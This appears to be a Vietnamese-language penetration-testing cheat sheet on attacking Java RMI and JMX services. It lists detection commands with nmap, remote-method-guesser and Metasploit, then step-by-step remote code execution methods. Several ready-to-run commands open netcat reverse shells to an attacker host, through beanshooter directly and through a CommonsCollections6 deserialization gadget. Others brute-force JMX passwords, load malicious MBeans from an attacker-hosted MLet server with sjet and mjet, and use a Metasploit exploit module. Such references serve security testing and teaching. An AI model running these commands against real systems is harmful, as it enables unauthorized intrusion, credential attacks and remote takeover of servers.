# Java RMI

> Java RMI (Remote Method Invocation) là một API của Java cho phép một object đang chạy trên một JVM (Java Virtual Machine) gọi các method trên một object đang chạy trên một JVM khác, ngay cả khi chúng nằm trên các máy vật lý khác nhau. RMI cung cấp một cơ chế cho việc tính toán phân tán dựa trên Java.

## Tóm tắt

* [Công cụ](#tools)
* [Phát hiện](#detection)
* [Phương pháp](#methodology)

  * [RCE bằng beanshooter](#rce-using-beanshooter)
  * [RCE bằng sjet/mjet](#rce-using-sjet-or-mjet)
  * [RCE bằng Metasploit](#rce-using-metasploit)
* [Tài liệu tham khảo](#references)

## Công cụ

* https://github.com/siberas/sjet - bộ công cụ khai thác JMX của siberas
* https://github.com/mogwailabs/mjet - bộ công cụ khai thác JMX của MOGWAI LABS
* https://github.com/qtc-de/remote-method-guesser - trình quét lỗ hổng Java RMI
* https://github.com/qtc-de/beanshooter - công cụ enumeration và tấn công JMX.

## Phát hiện

* Sử dụng [nmap](https://nmap.org/):

  ```powershell
  $ nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p TARGET_PORT TARGET_IP -Pn -v
  1089/tcp open  java-rmi Java RMI
  | rmi-vuln-classloader:
  |   VULNERABLE:
  |   RMI registry default configuration remote code execution vulnerability
  |     State: VULNERABLE
  |       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
  | rmi-dumpregistry:
  |   jmxrmi
  |     javax.management.remote.rmi.RMIServerImpl_Stub
  ```

* Sử dụng https://github.com/qtc-de/remote-method-guesser:

  ```bash
  $ rmg scan 172.17.0.2 --ports 0-65535
  [+] Scanning 6225 Ports on 172.17.0.2 for RMI services.
  [+]  [HIT] Found RMI service(s) on 172.17.0.2:40393 (DGC)
  [+]  [HIT] Found RMI service(s) on 172.17.0.2:1090  (Registry, DGC)
  [+]  [HIT] Found RMI service(s) on 172.17.0.2:9010  (Registry, Activator, DGC)
  [+]  [6234 / 6234] [#############################] 100%
  [+] Portscan finished.

  $ rmg enum 172.17.0.2 9010
  [+] RMI registry bound names:
  [+]
  [+]  - plain-server2
  [+]   --> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
  [+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]
  [+]  - legacy-service
  [+]   --> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
  [+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ffc, 4854919471498518309]
  [+]  - plain-server
  [+]   --> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
  [+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff8, 6721714394791464813]
  [...]
  ```

* Sử dụng https://github.com/rapid7/metasploit-framework

  ```bash
  use auxiliary/scanner/misc/java_rmi_server
  set RHOSTS <IPs>
  set RPORT <PORT>
  run
  ```

## Phương pháp

Nếu một dịch vụ Java Remote Method Invocation (RMI) được cấu hình không an toàn, nó có thể dễ bị nhiều phương thức Remote Code Execution (RCE) khác nhau. Một phương thức là host một file MLet và hướng dịch vụ JMX tải các MBean từ một server từ xa, có thể thực hiện bằng các công cụ như mjet hoặc sjet. Công cụ remote-method-guesser mới hơn và kết hợp việc enumeration dịch vụ RMI với tổng quan về các chiến lược tấn công đã được nhận diện.

### RCE bằng beanshooter

* Liệt kê các attribute khả dụng: `beanshooter info 172.17.0.2 9010`

* Hiển thị giá trị của một attribute: `beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose`

* Thiết lập giá trị của một attribute: `beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean`

* Brute-force một dịch vụ JMX được bảo vệ bằng password: `beanshooter brute 172.17.0.2 1090`

* Liệt kê các MBean đã đăng ký: `beanshooter list 172.17.0.2 9010`

* Deploy một MBean: `beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000`

* Enumeration JMX endpoint: `beanshooter enum 172.17.0.2 1090`

* Gọi method trên một JMX endpoint: `beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'vmVersion()'`

* Gọi các Java method public và static tùy ý:

  ```ps1
  beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
  beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
  ```

* Thực thi Standard MBean: `beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'`

* Các cuộc tấn công deserialization trên một JMX endpoint: `beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin`

### RCE bằng sjet hoặc mjet

#### Yêu cầu

* Jython
* JMX server có thể kết nối tới một HTTP service do attacker kiểm soát
* JMX authentication không được bật

#### Remote Command Execution

Cuộc tấn công bao gồm các bước sau:

* Khởi động một web server để host MLet và một JAR file chứa các MBean độc hại
* Tạo một instance của MBean `javax.management.loading.MLet` trên target server bằng JMX
* Gọi method `getMBeansFromURL` của MBean instance, truyền URL của web server làm parameter. Dịch vụ JMX sẽ kết nối tới HTTP server và parse file MLet.
* Dịch vụ JMX tải xuống và load các JAR file được tham chiếu trong file MLet, khiến MBean độc hại khả dụng thông qua JMX.
* Cuối cùng, attacker gọi các method từ MBean độc hại.

Khai thác JMX bằng https://github.com/siberas/sjet hoặc https://github.com/mogwailabs/mjet

```powershell
jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000
jython sjet.py TARGET_IP TARGET_PORT super_secret command "ls -la"
jython sjet.py TARGET_IP TARGET_PORT super_secret shell
jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password
jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall
jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 "touch /tmp/xxx"

jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
jython mjet.py TARGET_IP TARGET_PORT command super_secret "whoami"
jython mjet.py TARGET_IP TARGET_PORT command super_secret shell
```

### RCE bằng Metasploit

```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS <IPs>
set RPORT <PORT>
# configure also the payload if needed
run
```

## Tài liệu tham khảo

* [Attacking RMI based JMX services - Hans-Martin Münch - April 28, 2019](https://web.archive.org/web/20201024121233/https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)
* [JMX RMI - MULTIPLE APPLICATIONS RCE - Red Timmy Security - March 26, 2019](https://web.archive.org/web/20250523025328/https://www.exploit-db.com/docs/english/46607-jmx-rmi-%E2%80%93-multiple-applications-remote-code-execution.pdf)
* [remote-method-guesser - BHUSA 2021 Arsenal - Tobias Neitzel - August 15, 2021](https://web.archive.org/web/20210817144943/https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)
